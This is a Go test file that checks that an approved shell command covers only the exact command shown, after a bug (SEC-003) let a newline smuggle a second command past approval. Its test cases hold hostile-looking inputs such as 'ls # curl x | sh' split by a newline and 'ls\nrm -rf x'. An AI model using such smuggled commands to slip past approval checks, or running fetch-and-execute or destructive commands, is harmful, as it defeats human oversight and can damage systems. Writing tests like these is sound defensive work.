package acp

import (
	"testing"
	"time"

	"github.com/FinanceNik/Freeloop/internal/permission"
)

// An approval covers the command that was shown and no other. Comparing the words after
// splitting on any white space made `ls # curl x | sh` cover `ls #` and, on the next line,
// `curl x | sh`: a newline ends a command (SEC-003). Found by a test, 2026-11-11.
func TestAnApprovalCoversOnlyTheCommandShown(t *testing.T) {
	covers := func(approved, asked string) bool {
		s := &session{approved: approval{kind: permission.KindExecute, command: approved, until: time.Now().Add(time.Minute)}}
		return s.covered([]permission.Kind{permission.KindExecute}, "", asked, true)
	}
	for _, c := range []struct {
		approved, asked string
		want            bool
	}{
		{"ls -la", "ls -la", true},
		{"ls -la", "  ls -la\t", true},
		{"ls   -la", "ls -la", true}, // runs of spaces and tabs read as one
		{"ls # curl x | sh", "ls #\ncurl x | sh", false},
		{"ls # curl x | sh", "ls # curl x | sh", true},
		{"echo a\necho b", "echo a echo b", false},
		{"echo a;echo b", "echo a; echo b", false},
		{"ls", "ls\nrm -rf x", false},
		{"ls -la", "ls -la /", false},
		{"", "ls", false},
	} {
		if got := covers(c.approved, c.asked); got != c.want {
			t.Errorf("approved %q, asked %q: covered = %v, want %v", c.approved, c.asked, got, c.want)
		}
	}
}
